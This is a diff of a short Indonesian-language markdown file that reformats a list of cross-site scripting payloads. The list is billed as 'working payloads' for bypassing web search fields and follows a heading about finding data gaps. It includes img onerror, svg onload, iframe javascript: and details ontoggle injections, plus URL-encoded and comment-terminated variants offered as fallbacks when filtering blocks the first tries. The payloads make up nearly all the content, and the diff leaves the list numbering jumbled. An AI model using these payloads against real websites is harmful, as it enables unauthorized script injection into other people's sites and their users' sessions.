@@ -29,14 +29,28 @@ https://pastebin.com/8vFV9qHf
 # B. CARI CELAH DATA
 # Code Bypass Search Web Xss
 🎯 PAYLOAD YANG BEKERJA:
-```1. <img src=x onerror=alert("XSS")>```
-2. ``` <svg onload=alert("XSS")> ```
-3. ``` <iframe src="javascript:alert('XSS')"> ```
-4. ``` <body onload=alert("XSS")> ```
-5. ``` <details open ontoggle=alert("XSS")> ```
+1. ```
+2. <img src=x onerror=alert("XSS")>
+3. ```
+4. ```
+5. <svg onload=alert("XSS")>
+6. ```
+7. ```
+8. <iframe src="javascript:alert('XSS')">
+  ```
+9. ```
+<body onload=alert("XSS")>
+```
+10. ```
+11. <details open ontoggle=alert("XSS")>
+  ```
 
 🔧 Jika masih gagal, coba encode:
-6. ``` %3Cimg%20src%3Dx%20onerror%3Dalert%28%22XSS%22%29%3E ```
-7. ``` <img src=x onerror=alert("XSS")// ```
+6. ```
+%3Cimg%20src%3Dx%20onerror%3Dalert%28%22XSS%22%29%3E
+```
+7. ```
+8. <img src=x onerror=alert("XSS")//
+9. ```
 
 # Raditzz
